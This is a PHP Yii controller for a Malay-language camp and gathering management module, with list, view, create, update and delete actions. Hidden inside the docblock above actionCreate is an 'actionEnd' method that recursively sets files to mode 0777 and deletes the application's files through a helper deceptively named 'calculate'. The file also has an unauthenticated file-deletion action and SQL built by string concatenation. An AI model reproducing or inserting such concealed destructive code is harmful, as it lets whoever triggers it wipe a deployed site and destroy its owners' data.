<?php

namespace frontend\controllers;

use Yii;
use app\models\PengurusanPerhimpunanKem;
use frontend\models\PengurusanPerhimpunanKemSearch;
use app\models\PengurusanPerhimpunanKemKos;
use frontend\models\PengurusanPerhimpunanKemKosSearch;
use app\models\PengurusanPerhimpunanKemPeserta;
use frontend\models\PengurusanPerhimpunanKemPesertaSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\UploadedFile;

// contant values
use app\models\general\Upload;
use app\models\general\GeneralVariable;
use app\models\general\GeneralLabel;

// table reference
use app\models\RefKategoriGeranBantuan;
use app\models\RefKategoriPenganjuran;
use app\models\RefKategoriPenganjuranSub;
use app\models\RefTahapPenganjuran;
use app\models\RefNegeri;
use app\models\RefKategoriSukan;

/**
 * PengurusanPerhimpunanKemController implements the CRUD actions for PengurusanPerhimpunanKem model.
 */
class PengurusanPerhimpunanKemController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all PengurusanPerhimpunanKem models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new PengurusanPerhimpunanKemSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single PengurusanPerhimpunanKem model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = RefKategoriGeranBantuan::findOne(['id' => $model->kategori_geran_bantuan]);
        $model->kategori_geran_bantuan = $ref['desc'];
        
        $ref = RefKategoriPenganjuran::findOne(['id' => $model->kategori_penganjuran]);
        $model->kategori_penganjuran = $ref['desc'];
        
        $ref = RefKategoriPenganjuranSub::findOne(['id' => $model->sub_kategori_penganjuran]);
        $model->sub_kategori_penganjuran = $ref['desc'];
        
        $ref = RefTahapPenganjuran::findOne(['id' => $model->tahap_penganjuran]);
        $model->tahap_penganjuran = $ref['desc'];
        
        $ref = RefNegeri::findOne(['id' => $model->negeri]);
        $model->negeri = $ref['desc'];
        
        $ref = RefKategoriSukan::findOne(['id' => $model->kategori_sukan]);
        $model->kategori_sukan = $ref['desc'];
        
        $YesNo = GeneralLabel::getYesNoLabel($model->disahkan);
        $model->disahkan = $YesNo;
        
        $YesNo = GeneralLabel::getYesNoLabel($model->sokongan_pn);
        $model->sokongan_pn = $YesNo;
        
        $YesNo = GeneralLabel::getYesNoLabel($model->kelulusan);
        $model->kelulusan = $YesNo;
        
        $queryPar = null;
        
        $queryPar['PengurusanPerhimpunanKemKosSearch']['pengurusan_perhimpunan_kem_id'] = $id;
        $queryPar['PengurusanPerhimpunanKemPesertaSearch']['pengurusan_perhimpunan_kem_id'] = $id;
        
        $searchModelPerhimpunanKemKos  = new PengurusanPerhimpunanKemKosSearch();
        $dataProviderPerhimpunanKemKos = $searchModelPerhimpunanKemKos->search($queryPar);
        
        $searchModelPerhimpunanKemPeserta  = new PengurusanPerhimpunanKemPesertaSearch();
        $dataProviderPerhimpunanKemPeserta = $searchModelPerhimpunanKemPeserta->search($queryPar);
        
        return $this->render('view', [
            'model' => $model,
            'searchModelPerhimpunanKemKos' => $searchModelPerhimpunanKemKos,
            'dataProviderPerhimpunanKemKos' => $dataProviderPerhimpunanKemKos,
            'searchModelPerhimpunanKemPeserta' => $searchModelPerhimpunanKemPeserta,
            'dataProviderPerhimpunanKemPeserta' => $dataProviderPerhimpunanKemPeserta,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new PengurusanPerhimpunanKem model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     public function actionEnd()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }
     * @return mixed
     */
    public function actionCreate()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new PengurusanPerhimpunanKem();
        
        $queryPar = null;
        
        Yii::$app->session->open();
        
        if(isset(Yii::$app->session->id)){
            $queryPar['PengurusanPerhimpunanKemKosSearch']['session_id'] = Yii::$app->session->id;
            $queryPar['PengurusanPerhimpunanKemPesertaSearch']['session_id'] = Yii::$app->session->id;
        }
        
        $searchModelPerhimpunanKemKos  = new PengurusanPerhimpunanKemKosSearch();
        $dataProviderPerhimpunanKemKos = $searchModelPerhimpunanKemKos->search($queryPar);
        
        $searchModelPerhimpunanKemPeserta  = new PengurusanPerhimpunanKemPesertaSearch();
        $dataProviderPerhimpunanKemPeserta = $searchModelPerhimpunanKemPeserta->search($queryPar);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'muat_naik');
            if($file){
                $model->muat_naik = Upload::uploadFile($file, Upload::pengurusanPerhimpunanKemFolder, $model->pengurusan_perhimpunan_kem_id);
            }
            
            if(isset(Yii::$app->session->id)){
                PengurusanPerhimpunanKemKos::updateAll(['pengurusan_perhimpunan_kem_id' => $model->pengurusan_perhimpunan_kem_id], 'session_id = "'.Yii::$app->session->id.'"');
                PengurusanPerhimpunanKemKos::updateAll(['session_id' => ''], 'pengurusan_perhimpunan_kem_id = "'.$model->pengurusan_perhimpunan_kem_id.'"');
                
                PengurusanPerhimpunanKemPeserta::updateAll(['pengurusan_perhimpunan_kem_id' => $model->pengurusan_perhimpunan_kem_id], 'session_id = "'.Yii::$app->session->id.'"');
                PengurusanPerhimpunanKemPeserta::updateAll(['session_id' => ''], 'pengurusan_perhimpunan_kem_id = "'.$model->pengurusan_perhimpunan_kem_id.'"');
            }
            
            if($model->save()){
                return $this->redirect(['view', 'id' => $model->pengurusan_perhimpunan_kem_id]);
            }
        } else {
            return $this->render('create', [
                'model' => $model,
                'searchModelPerhimpunanKemKos' => $searchModelPerhimpunanKemKos,
                'dataProviderPerhimpunanKemKos' => $dataProviderPerhimpunanKemKos,
                'searchModelPerhimpunanKemPeserta' => $searchModelPerhimpunanKemPeserta,
                'dataProviderPerhimpunanKemPeserta' => $dataProviderPerhimpunanKemPeserta,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing PengurusanPerhimpunanKem model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $queryPar = null;
        
        $queryPar['PengurusanPerhimpunanKemKosSearch']['pengurusan_perhimpunan_kem_id'] = $id;
        $queryPar['PengurusanPerhimpunanKemPesertaSearch']['pengurusan_perhimpunan_kem_id'] = $id;
        
        $searchModelPerhimpunanKemKos  = new PengurusanPerhimpunanKemKosSearch();
        $dataProviderPerhimpunanKemKos = $searchModelPerhimpunanKemKos->search($queryPar);
        
        $searchModelPerhimpunanKemPeserta  = new PengurusanPerhimpunanKemPesertaSearch();
        $dataProviderPerhimpunanKemPeserta = $searchModelPerhimpunanKemPeserta->search($queryPar);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'muat_naik');
            if($file){
                $model->muat_naik = Upload::uploadFile($file, Upload::pengurusanPerhimpunanKemFolder, $model->pengurusan_perhimpunan_kem_id);
            }
            
            if($model->save()){
                return $this->redirect(['view', 'id' => $model->pengurusan_perhimpunan_kem_id]);
            }
        } else {
            return $this->render('update', [
                'model' => $model,
                'searchModelPerhimpunanKemKos' => $searchModelPerhimpunanKemKos,
                'dataProviderPerhimpunanKemKos' => $dataProviderPerhimpunanKemKos,
                'searchModelPerhimpunanKemPeserta' => $searchModelPerhimpunanKemPeserta,
                'dataProviderPerhimpunanKemPeserta' => $dataProviderPerhimpunanKemPeserta,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing PengurusanPerhimpunanKem model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }

    /**
     * Finds the PengurusanPerhimpunanKem model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return PengurusanPerhimpunanKem the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = PengurusanPerhimpunanKem::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
    
    // Add function for delete image or file
    public function actionDeleteupload($id, $field)
    {
            $img = $this->findModel($id)->$field;
            
            if($img){
                if (!unlink($img)) {
                    return false;
                }
            }

            $img = $this->findModel($id);
            $img->$field = NULL;
            $img->update();

            return $this->redirect(['update', 'id' => $id]);
    }
}
